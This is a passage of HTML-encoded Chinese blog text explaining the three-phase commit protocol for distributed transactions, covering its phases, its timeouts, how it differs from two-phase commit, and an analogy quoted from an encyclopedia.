id=\"&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase-commit-3PC&#xFF09;\"><a href=\"#&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase-commit-3PC&#xFF09;\" class=\"headerlink\" title=\"&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase commit/3PC&#xFF09;\"></a>&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;Three-phase commit/3PC&#xFF09;</h3><font style=\"color:red;\">&#x6539;&#x8FDB;&#x4E86;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;,3PC&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x5355;&#x70B9;&#x6545;&#x969C;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x963B;&#x585E;</font>\n\n<ul>\n<li>&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x3002;&#x540C;&#x65F6;&#x5728;&#x534F;&#x8C03;&#x8005;&#x548C;&#x53C2;&#x4E0E;&#x8005;&#x4E2D;&#x90FD;&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x3002;</li>\n<li>&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x548C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#x3002;&#x4FDD;&#x8BC1;&#x4E86;&#x5728;&#x6700;&#x540E;&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#x4E4B;&#x524D;&#x5404;&#x53C2;&#x4E0E;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;</li>\n</ul>\n<p>&#x9664;&#x4E86;&#x5F15;&#x5165;&#x8D85;&#x65F6;&#x673A;&#x5236;&#x4E4B;&#x5916;&#xFF0C;3PC&#x628A;2PC&#x7684;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#x518D;&#x6B21;&#x4E00;&#x5206;&#x4E3A;&#x4E8C;&#xFF0C;&#x8FD9;&#x6837;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5C31;&#x6709;CanCommit&#x3001;PreCommit&#x3001;DoCommit&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#x3002;</p>\n<h4 id=\"CanCommit&#x9636;&#x6BB5;\"><a href=\"#CanCommit&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"CanCommit&#x9636;&#x6BB5;\"></a>CanCommit&#x9636;&#x6BB5;</h4><ol>\n<li><strong>&#x4E8B;&#x52A1;&#x8BE2;&#x95EE;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;CanCommit&#x8BF7;&#x6C42;&#x3002;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;&#x3002;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x54CD;&#x5E94;&#x3002;</li>\n<li><strong>&#x54CD;&#x5E94;&#x53CD;&#x9988;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x5230;CanCommit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x5176;&#x81EA;&#x8EAB;&#x8BA4;&#x4E3A;&#x53EF;&#x4EE5;&#x987A;&#x5229;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;Yes&#x54CD;&#x5E94;&#xFF0C;&#x5E76;&#x8FDB;&#x5165;&#x9884;&#x5907;&#x72B6;&#x6001;&#x3002;&#x5426;&#x5219;&#x53CD;&#x9988;No</li>\n</ol>\n<h4 id=\"PreCommit&#x9636;&#x6BB5;\"><a href=\"#PreCommit&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"PreCommit&#x9636;&#x6BB5;\"></a>PreCommit&#x9636;&#x6BB5;</h4><p>&#x5047;&#x5982;&#x534F;&#x8C03;&#x8005;&#x4ECE;&#x6240;&#x6709;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x83B7;&#x5F97;&#x7684;&#x53CD;&#x9988;&#x90FD;&#x662F;Yes&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x9884;&#x6267;&#x884C;</p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x9884;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;PreCommit&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x8FDB;&#x5165;Prepared&#x9636;&#x6BB5;&#x3002;</li>\n<li><strong>&#x4E8B;&#x52A1;&#x9884;&#x63D0;&#x4EA4;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;PreCommit&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x4F1A;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;undo&#x548C;redo&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5230;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x4E2D;&#x3002;</li>\n<li><strong>&#x54CD;&#x5E94;&#x53CD;&#x9988;</strong> &#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x6210;&#x529F;&#x7684;&#x6267;&#x884C;&#x4E86;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;ACK&#x54CD;&#x5E94;&#xFF0C;&#x540C;&#x65F6;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6307;&#x4EE4;&#x3002;</li>\n</ol>\n<p>&#x5047;&#x5982;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x53C2;&#x4E0E;&#x8005;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;&#x4E86;No&#x54CD;&#x5E94;&#xFF0C;&#x6216;&#x8005;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x90FD;&#x6CA1;&#x6709;&#x63A5;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;&#x3002;</p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;abort&#x8BF7;&#x6C42;&#x3002;</li>\n<li><strong>&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;</strong> &#x53C2;&#x4E0E;&#x8005;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;abort&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF08;&#x6216;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4ECD;&#x672A;&#x6536;&#x5230;&#x534F;&#x8C03;&#x8005;&#x7684;&#x8BF7;&#x6C42;&#xFF09;&#xFF0C;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;&#x3002;</li>\n</ol>\n<h4 id=\"doCommit&#x9636;&#x6BB5;\"><a href=\"#doCommit&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"doCommit&#x9636;&#x6BB5;\"></a>doCommit&#x9636;&#x6BB5;</h4><p>&#x8BE5;&#x9636;&#x6BB5;&#x8FDB;&#x884C;&#x771F;&#x6B63;&#x7684;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x4E24;&#x79CD;&#x60C5;&#x51B5;</p>\n<p><strong>&#x6267;&#x884C;&#x63D0;&#x4EA4;</strong></p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42; </strong>&#x534F;&#x8C03;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;&#x7684;ACK&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x5C06;&#x4ECE;&#x9884;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x8FDB;&#x5165;&#x5230;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x3002;&#x5E76;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;doCommit&#x8BF7;&#x6C42;&#x3002;</li>\n<li><strong>&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;doCommit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6B63;&#x5F0F;&#x7684;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x3002;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#x91CA;&#x653E;&#x6240;&#x6709;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x3002;</li>\n<li><strong>&#x54CD;&#x5E94;&#x53CD;&#x9988;</strong> &#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;Ack&#x54CD;&#x5E94;&#x3002;</li>\n<li><strong>&#x5B8C;&#x6210;&#x4E8B;&#x52A1;</strong> &#x534F;&#x8C03;&#x8005;&#x63A5;&#x6536;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;ack&#x54CD;&#x5E94;&#x4E4B;&#x540E;&#xFF0C;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;</li>\n</ol>\n<p><strong>&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;</strong></p>\n<p>&#x534F;&#x8C03;&#x8005;&#x6CA1;&#x6709;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;&#x7684;ACK&#x54CD;&#x5E94;&#xFF08;&#x53EF;&#x80FD;&#x662F;&#x63A5;&#x53D7;&#x8005;&#x53D1;&#x9001;&#x7684;&#x4E0D;&#x662F;ACK&#x54CD;&#x5E94;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x54CD;&#x5E94;&#x8D85;&#x65F6;&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;&#x3002;</p>\n<ol>\n<li><strong>&#x53D1;&#x9001;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</strong> &#x534F;&#x8C03;&#x8005;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;abort&#x8BF7;&#x6C42;</li>\n<li><strong>&#x4E8B;&#x52A1;&#x56DE;&#x6EDA;</strong> &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;abort&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x5229;&#x7528;&#x5176;&#x5728;&#x9636;&#x6BB5;&#x4E8C;&#x8BB0;&#x5F55;&#x7684;undo&#x4FE1;&#x606F;&#x6765;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#x91CA;&#x653E;&#x6240;&#x6709;&#x7684;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x3002;</li>\n<li><strong>&#x53CD;&#x9988;&#x7ED3;&#x679C;</strong> &#x53C2;&#x4E0E;&#x8005;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#xFF0C;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;ACK&#x6D88;&#x606F;</li>\n<li><strong>&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;</strong> &#x534F;&#x8C03;&#x8005;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53CD;&#x9988;&#x7684;ACK&#x6D88;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD;</li>\n</ol>\n<p><strong>&#x5728;doCommit&#x9636;&#x6BB5;&#xFF0C;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x65E0;&#x6CD5;&#x53CA;&#x65F6;&#x63A5;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;doCommit&#x6216;&#x8005;rebort&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x7EE7;&#x7EED;&#x8FDB;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x3002;&#xFF08;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x5E94;&#x8BE5;&#x662F;&#x57FA;&#x4E8E;&#x6982;&#x7387;&#x6765;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;<font style=\"color:red;\">&#x5F53;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;PreCommit&#x8BF7;&#x6C42;&#xFF0C;</font>&#x90A3;&#x4E48;&#x534F;&#x8C03;&#x8005;&#x4EA7;&#x751F;PreCommit&#x8BF7;&#x6C42;&#x7684;&#x524D;&#x63D0;&#x6761;&#x4EF6;&#x662F;&#x4ED6;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x6536;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;CanCommit&#x54CD;&#x5E94;&#x90FD;&#x662F;Yes&#x3002;&#xFF08;&#x4E00;&#x65E6;&#x53C2;&#x4E0E;&#x8005;&#x6536;&#x5230;&#x4E86;PreCommit&#xFF0C;&#x610F;&#x5473;&#x4ED6;&#x77E5;&#x9053;&#x5927;&#x5BB6;&#x5176;&#x5B9E;&#x90FD;&#x540C;&#x610F;&#x4FEE;&#x6539;&#x4E86;&#xFF09;&#x6240;&#x4EE5;&#xFF0C;&#x4E00;&#x53E5;&#x8BDD;&#x6982;&#x62EC;&#x5C31;&#x662F;&#xFF0C;&#x5F53;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x8D85;&#x65F6;&#x7B49;&#x539F;&#x56E0;&#xFF0C;&#x867D;&#x7136;&#x53C2;&#x4E0E;&#x8005;&#x6CA1;&#x6709;&#x6536;&#x5230;commit&#x6216;&#x8005;abort&#x54CD;&#x5E94;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x6709;&#x7406;&#x7531;&#x76F8;&#x4FE1;&#xFF1A;&#x6210;&#x529F;&#x63D0;&#x4EA4;&#x7684;&#x51E0;&#x7387;&#x5F88;&#x5927;&#x3002; &#xFF09;</strong></p>\n<hr>\n<h3 id=\"2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;\"><a href=\"#2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;\" class=\"headerlink\" title=\"2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;\"></a>2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;</h3><font style=\"color:red;\"><br>&#x76F8;&#x5BF9;&#x4E8E;2PC&#xFF0C;3PC&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x5355;&#x70B9;&#x6545;&#x969C;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x963B;&#x585E;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x65E6;&#x53C2;&#x4E0E;&#x8005;&#x65E0;&#x6CD5;&#x53CA;&#x65F6;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;&#x4FE1;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x4ED6;&#x4F1A;&#x9ED8;&#x8BA4;&#x6267;&#x884C;commit&#x3002;&#x800C;&#x4E0D;&#x4F1A;&#x4E00;&#x76F4;&#x6301;&#x6709;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x5E76;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x539F;&#x56E0;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;&#x7684;abort&#x54CD;&#x5E94;&#x6CA1;&#x6709;&#x53CA;&#x65F6;&#x88AB;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;&#xFF0C;&#x90A3;&#x4E48;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#x6267;&#x884C;&#x4E86;commit&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x548C;&#x5176;&#x4ED6;&#x63A5;&#x5230;abort&#x547D;&#x4EE4;&#x5E76;&#x6267;&#x884C;&#x56DE;&#x6EDA;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x3002;</font>\n\n<hr>\n<h3 id=\"&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;\"><a href=\"#&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;\" class=\"headerlink\" title=\"&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;\"></a>&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;</h3><p>&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Three-phase commit&#xFF09;&#xFF0C;&#x4E5F;&#x53EB;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Three-phase commit protocol&#xFF09;&#xFF0C;&#x662F;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8303;&#x7574;&#x4E0B;&#xFF0C;&#x4F7F;&#x5F97;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x5185;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x80FD;&#x591F;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x7684;&#x4E00;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x662F;&#x4E3A;&#x89E3;&#x51B3;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;|&#x7684;&#x7F3A;&#x70B9;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x3002;</p>\n<p><strong>&#x4E0E;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x662F;&#x201C;&#x975E;&#x963B;&#x585E;&#x201D;&#x534F;&#x8BAE;&#x3002;</strong>&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5728;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x4E0E;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#xFF0C;&#x4F7F;&#x5F97;&#x539F;&#x5148;&#x5728;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E2D;&#xFF0C;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x6295;&#x7968;&#x4E4B;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x5D29;&#x6E83;&#x6216;&#x9519;&#x8BEF;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;&#x53C2;&#x4E0E;&#x8005;&#x5904;&#x4E8E;&#x65E0;&#x6CD5;&#x77E5;&#x6653;&#x662F;&#x5426;&#x63D0;&#x4EA4;&#x6216;&#x8005;&#x4E2D;&#x6B62;&#x7684;&#x201C;&#x4E0D;&#x786E;&#x5B9A;&#x72B6;&#x6001;&#x201D;&#x6240;&#x4EA7;&#x751F;&#x7684;&#x53EF;&#x80FD;&#x76F8;&#x5F53;&#x957F;&#x7684;&#x5EF6;&#x65F6;&#x7684;&#x95EE;&#x9898;[1]&#x5F97;&#x4EE5;&#x89E3;&#x51B3;&#x3002; &#x4E3E;&#x4F8B;&#x6765;&#x8BF4;&#xFF0C;&#x5047;&#x8BBE;&#x6709;&#x4E00;&#x4E2A;&#x51B3;&#x7B56;&#x5C0F;&#x7EC4;&#x7531;&#x4E00;&#x4E2A;&#x4E3B;&#x6301;&#x4EBA;&#x8D1F;&#x8D23;&#x4E0E;&#x591A;&#x4F4D;&#x7EC4;&#x5458;&#x4EE5;&#x7535;&#x8BDD;&#x8054;&#x7EDC;&#x65B9;&#x5F0F;&#x534F;&#x8C03;&#x662F;&#x5426;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF0C;&#x4EE5;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x6765;&#x8BF4;&#xFF0C;&#x4E3B;&#x6301;&#x4EBA;&#x6536;&#x5230;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x8BF7;&#x6C42;&#xFF0C;&#x6253;&#x7535;&#x8BDD;&#x8DDF;&#x6BCF;&#x4E2A;&#x7EC4;&#x5458;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x901A;&#x8FC7;&#x5E76;&#x7EDF;&#x8BA1;&#x56DE;&#x590D;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6700;&#x540E;&#x51B3;&#x5B9A;&#x6253;&#x7535;&#x8BDD;&#x901A;&#x77E5;&#x5404;&#x7EC4;&#x5458;&#x3002;&#x8981;&#x662F;&#x4E3B;&#x6301;&#x4EBA;&#x5728;&#x8DDF;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x901A;&#x5B8C;&#x7535;&#x8BDD;&#x540E;&#x5931;&#x5FC6;&#xFF0C;&#x800C;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x5728;&#x5F97;&#x77E5;&#x7ED3;&#x679C;&#x5E76;&#x6267;&#x884C;&#x540E;&#x8001;&#x4EBA;&#x75F4;&#x5446;&#xFF0C;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x91CD;&#x65B0;&#x9009;&#x51FA;&#x4E3B;&#x6301;&#x4EBA;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x6700;&#x540E;&#x7684;&#x63D0;&#x6848;&#x51B3;&#x5B9A;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x901A;&#x8FC7;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x9A73;&#x56DE;&#xFF0C;&#x4E0D;&#x7BA1;&#x5927;&#x5BB6;&#x9009;&#x62E9;&#x54EA;&#x4E00;&#x79CD;&#x51B3;&#x5B9A;&#xFF0C;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4E0E;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x5DF2;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x771F;&#x5B9E;&#x51B3;&#x5B9A;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x8001;&#x677F;&#x5C31;&#x4F1A;&#x4E0D;&#x5F00;&#x5FC3;&#x8BA4;&#x4E3A;&#x51B3;&#x7B56;&#x5C0F;&#x7EC4;&#x6C9F;&#x901A;&#x6709;&#x95EE;&#x9898;&#x800C;&#x89E3;&#x96C7;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5373;&#x662F;&#x5F15;&#x5165;&#x4E86;&#x53E6;&#x4E00;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x4E3B;&#x6301;&#x4EBA;&#x6253;&#x7535;&#x8BDD;&#x8DDF;&#x7EC4;&#x5458;&#x901A;&#x77E5;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#xFF0C;&#x4EE5;&#x907F;&#x514D;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x771F;&#x5B9E;&#x51B3;&#x5B9A;&#x800C;&#x9020;&#x6210;&#x51B3;&#x5B9A;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x5931;&#x4E1A;&#x5371;&#x673A;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x80FD;&#x591F;&#x89E3;&#x51B3;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x56DE;&#x5230;&#x521A;&#x521A;&#x63D0;&#x5230;&#x7684;&#x72B6;&#x51B5;&#xFF0C;&#x5728;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x5B8C;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x540E;&#x4E24;&#x4EBA;&#x610F;&#x5916;&#x5931;&#x5FC6;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x5168;&#x4F53;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x51B3;&#x5B9A;&#x4E3A;&#x4F55;&#xFF0C;&#x5168;&#x4F53;&#x51B3;&#x7B56;&#x7EC4;&#x5458;&#x4ECD;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x534F;&#x8C03;&#x8FC7;&#x7A0B;&#x6216;&#x76F4;&#x63A5;&#x5426;&#x51B3;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x4E0D;&#x4E00;&#x81F4;&#x51B3;&#x5B9A;&#x800C;&#x5931;&#x4E1A;&#x3002;&#x90A3;&#x4E48;&#x5F53;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x5B8C;&#x5168;&#x4F53;&#x7EC4;&#x5458;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x5E76;&#x5F97;&#x5230;&#x5927;&#x5BB6;&#x7684;&#x518D;&#x6B21;&#x786E;&#x5B9A;&#x540E;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636